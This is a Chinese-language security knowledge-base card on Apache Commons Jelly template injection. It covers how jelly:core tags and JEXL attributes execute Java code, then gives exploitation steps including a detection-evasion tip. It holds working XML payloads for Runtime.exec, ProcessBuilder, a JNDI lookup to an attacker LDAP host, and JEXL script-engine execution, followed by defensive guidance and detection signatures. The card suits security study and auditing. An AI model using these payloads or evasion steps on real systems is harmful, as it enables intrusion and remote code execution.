---
id: web-java-expression-jelly-core-tag-jexl-injection-rce
title: Apache Commons Jelly 模板解析注入：jelly:core 危险标签（invoke/invokeStatic/new/set）与标签属性中的 JEXL 表达式都能直接执行 Java 代码
type: scenario
domain: web
path: web/java/expression
technique: jelly-core-tag-jexl-expression-injection
tags:
- web
- java
- expression
- jelly
- jexl
- template-injection
- xml
- rce
- jndi
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-T2-3W3
  verified_at: '2026-11-08T19:33:41+08:00'
  notes: 已对照原文核对；本次核对未读取图片；jelly:core 标签清单（invokeStatic/invoke/new/set/setProperties/useBean/getStatic/expr/out/break/whitespace/define:taglib uri）与 CoreTagLibrary 说明、Runtime.exec 与 ProcessBuilder 两段 XML、JdbcRowSetImpl dataSourceName→autoCommit 的 setter 顺序敏感点、JEXL 属性求值路径均与正文一致；原文未给受影响版本区间（示例依赖 commons-jelly 1.0 仅为测试环境），未设 affected_versions；原文提到的 import/include 套娃与 if 承载点卡片已复述但未逐字验证；未执行文中命令/PoC，未访问文中 URL
url: /docs/web/java/expression/web-java-expression-jelly-core-tag-jexl-injection-rce/
draft: false
kb_aliases:
- Commons Jelly 注入
- Jelly 模板注入
- jelly:core 标签注入
- Jelly RCE
- JEXL 表达式注入
- ServiceNow Jelly 模板
- invokeStatic 任意静态方法
- NewTag 实例化 ProcessBuilder
- setProperties JdbcRowSetImpl
---

## 一句话结论

Apache Commons Jelly 用 `JellyContext.compileScript()` 解析 `.jelly` 脚本时，会把 XML 标签映射成 Java 类的 `doTag()` 调用、并把标签属性（`value`/`test`/`uri` 等）当作 JEXL 表达式求值；因此只要能控制被解析的 Jelly 内容，攻击者既可以用 `jelly:core` 里现成的危险标签（`invokeStatic`+`invoke` 打 `Runtime.exec`、`new` 实例化 `ProcessBuilder`、`set`/`setProperties` 触发 setter 走 JNDI、`useBean` 一步实例化）直接执行任意代码，也可以只在任意标签属性里塞一个 JEXL 表达式（`expr`、`out`、`if`、`break`、`whitespace`、`define:taglib` 的 `uri`）在求值时反射执行命令——两条路径都无需额外 gadget，模板本身就是代码执行入口。

## 原理

- **Jelly 的执行模型**：`Script.run(context, XMLOutput)` 遍历 XML 树，按标签名从 `CoreTagLibrary`（`org.apache.commons.jelly.tags.core`）查找对应的 `Tag` 实现，然后调用它的 `doTag()`。标签的 `var`/`value`/`on`/`method`/`className` 等属性都会被框架计算成对象再传入，其中带 EL/JEXL 语义的属性交给 JEXL 引擎求值。
- **为什么危险标签等于任意代码**：`invokeStatic` 能调用任意类的静态方法（`Runtime.getRuntime()`），`invoke` 能在任意对象上调用任意方法并带 `arg` 子标签（`exec("cmd")`），`new` 能实例化任意类（含带参构造，可直接 `new ProcessBuilder(list)` 后 `invoke start`）。这三者构成「反射调用全集」，命令执行、文件读写、发请求都不需要额外依赖。
- **为什么 setter 也是入口**：`set`/`setProperties` 通过 `BeanUtils#setProperty` 对目标对象调用 setter，可先用 `new`/`useBean` 拿到任意类的实例，再按属性名触发其副作用。典型案例是 `com.sun.rowset.JdbcRowSetImpl`：设 `dataSourceName` 为攻击者 LDAP 地址、再设 `autoCommit`，setter 内部会发起 JNDI lookup，从而落到 JNDI 注入链。需要注意 setter 的**执行顺序**：`dataSourceName` 必须先于触发 lookup 的属性，所以 `useBean` 一次写多个属性会因顺序不可控而失败，必须拆成两个 `set`（或 `setProperties` + `set`）。
- **为什么表达式属性等价于 RCE**：JEXL 允许属性链上调用方法并访问 `.class`，所以 `${str.class.forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('js').eval('...')}` 这类表达式在求值阶段就能拿到 `Class`→反射→任意执行；它不仅限于 `expr` 标签，`invokeBody` 解析标签体内容时同样走 JEXL，因此 `out`、`whitespace`、`if`、`break` 等也会求值。
- **成立前提**：应用把不可信的 XML/Jelly 交给 Jelly 解析（模板可编辑、参数被当模板渲染、组件把请求体当 Jelly 脚本），且没有对标签库白名单、JEXL 限制做收敛。这与「XML 解析器被外部实体/脚本能力污染」是同一类根因：解析器具备执行副作用，输入即代码。

## 触发条件

- 目标使用 Apache Commons Jelly 解析攻击者可控或部分可控的 `.jelly` 内容（模板文件上传/编辑、参数拼进模板、把请求体当脚本 `compileScript`）。
- 解析时未限制可用标签库、未禁用 JEXL，且未把 `JellyContext` 的能力收窄。
- 需要 JNDI 链时：目标 JDK 允许该 JNDI 对象/协议（高版本 JDK 需额外绕过），且目标能出网到攻击者的 LDAP/RMI 服务。
- 需要 `NewTag` 实例化带参构造的对象时，目标类必须在 classpath/`Class.forName` 可达。

## 利用步骤

1. **确认入口**：找到一个「内容会被 Jelly 解析」的输入点——模板编辑/上传、可编辑的页面片段、被拼进 `.jelly` 的参数；确认改动后模板被重新 `compileScript` + `run`。
2. **最小验证**：先放一个纯文本标签（如自定义标签名）观察是否报 Jelly 解析错误（`No such tag`），确认确实是 Jelly 在解析而不是普通 XML 解析。
3. **选执行面**：优先用表达式属性（最不容易被标签白名单挡住），其次用 core 标签；两者都失败再试自定义 taglib（`define:taglib`）。
4. **打命令**：用 `invokeStatic` 取 `Runtime`，再 `invoke exec`；或用 `new` 构造 `ProcessBuilder` 后 `start`。
5. **取回显/外带**：Jelly 的输出走 `XMLOutput`，可把命令结果写进标签体；无回显时改成 `ProcessBuilder` 起反弹或写文件。
6. **JNDI 变体**：起 LDAP/RMI 服务，用 `new`+`set` 两步触发 `JdbcRowSetImpl` 的 lookup。
7. **降噪**：把危险标签名拆开/用 `define:taglib`、`import`、`include` 把真正的执行片段放到另一个脚本里，减少关键标签在同一样本中的出现次数。

## PoC

```xml
<!-- 1) invokeStatic + invoke：Runtime.exec -->
<jelly xmlns="jelly:core">
  <invokeStatic var="Runtime" className="java.lang.Runtime" method="getRuntime"/>
  <invoke method="exec" var="exec" on="${Runtime}">
    <arg type="java.lang.String" value="id"/>
  </invoke>
</jelly>
```

```xml
<!-- 2) new + invoke：ProcessBuilder 带参构造后 start -->
<jelly xmlns="jelly:core">
  <new var="list" className="java.util.ArrayList"/>
  <invoke var="a1" method="add" on="${list}"><arg value="sh"/></invoke>
  <invoke var="a2" method="add" on="${list}"><arg value="-c"/></invoke>
  <invoke var="a3" method="add" on="${list}"><arg value="id"/></invoke>
  <new var="pb" className="java.lang.ProcessBuilder"><arg value="${list}"/></new>
  <invoke on="${pb}" method="start"/>
</jelly>
```

```xml
<!-- 3) set 触发 JNDI：JdbcRowSetImpl（顺序敏感，必须两步） -->
<jelly xmlns="jelly:core">
  <new className="com.sun.rowset.JdbcRowSetImpl" var="jndi"/>
  <set target="${jndi}" property="dataSourceName" value="ldap://attacker:1389/exp"/>
  <set target="${jndi}" property="autoCommit" value="1"/>
</jelly>
```

```xml
<!-- 4) 仅用标签属性的 JEXL 表达式（expr / out / whitespace / break / define:taglib 的 uri 同理） -->
<jelly xmlns="jelly:core">
  <getStatic var="str" className="org.apache.commons.jelly.servlet.JellyServlet" field="REQUEST"/>
  <expr value="${str.class.forName('javax.script.ScriptEngineManager').newInstance()
                 .getEngineByName('js').eval('java.lang.Runtime.getRuntime().exec(&quot;id&quot;)')}"/>
</jelly>
```

说明：第 4 类只需一个「能承载 JEXL 的属性」即可，`value`/`test`/`uri` 都可替换；`getStatic` 只是为了拿到一个非空对象来起属性链，也可换成任何上下文里已有的对象。

## 变体与关联

- **危险标签变体**：`invokeStatic`（任意静态方法）、`invoke`（任意实例方法 + `arg`）、`new`（任意构造）、`set`/`setProperties`（任意 setter）、`useBean`（new+set 合并）、`remove`、`import`/`include`（套娃拆分载荷）。
- **表达式承载点变体**：`expr`、`out`、`if`/`when`/`choose` 的 `test`、`break`、`whitespace`、`forEach` 的 `items`、`define:taglib` 的 `uri`；凡是交给 JEXL 的属性都可作为 sink。
- **利用链终点变体**：`Runtime.exec` / `ProcessBuilder.start`（直接命令执行）、`JdbcRowSetImpl`→JNDI（接 LDAP/RMI 反序列化链）、`ScriptEngineManager`（Nashorn/Groovy 二次执行）、写文件/读文件。
- **同类根因**：Apache Commons SCXML 的 XML 执行能力、各类「模板可编辑」导致的 SSTI；区别在于 Jelly 的危险面是**标签库自带的反射能力 + JEXL 求值**，不依赖某个模板语法的字符串拼接。
- **关联**：[[web-java-expression-scriptengine-isjson-eval]]（ScriptEngine 直接 eval 的同类反射执行）、[[web-generic-xxe-inband-file-read-default-insecure]]（XML 解析器能力失控的同源问题）；JNDI 侧的后续利用参见 `web/java/deserialization/jndi` 下各卡。
- **边界**：若应用已把 Jelly 的标签库限制为白名单、或关闭 JEXL 求值（属性按字面量传入），上述 payload 会退化成普通 XML 而无法执行；`ProcessBuilder`/`JdbcRowSetImpl` 需要对应类可达。

## 检测与防御

- **不要用 Jelly 解析不可信输入**：模板必须来自服务端受控目录，禁止把请求参数拼进 `.jelly`，禁止上传即解析。
- **收窄执行面**：自定义 `TagLibrary` 只暴露必要标签（去掉 `invoke`/`invokeStatic`/`new`/`set`/`setProperties`/`useBean`/`import`/`include`），关闭 JEXL 求值或使用受限表达式解析器；`JellyContext` 不注入高权限对象（不要放 `JellyServlet.REQUEST` 之类可起属性链的引用）。
- **JNDI 侧**：升级 JDK 并禁用远程 codebase（`com.sun.jndi.ldap.object.trustURLCodebase=false` 等），对 `JdbcRowSetImpl` 这类可触发 lookup 的类做黑名单。
- **检测信号**：请求/文件中出现 `jelly:core`、`invokeStatic`、`invoke`、`new`、`setProperties`、`JdbcRowSetImpl`、`ScriptEngineManager`、`${...class.forName...}` 等特征；应用进程出现 `sh -c`/`cmd /c` 子进程且父进程为 Java 应用；异常外连 LDAP(389/636)/RMI(1099) 端口。
- **代码审计**：全局搜索 `JellyContext`、`compileScript`、`run(`、`XMLOutput`，逐个确认模板来源是否可信、标签库是否收敛。
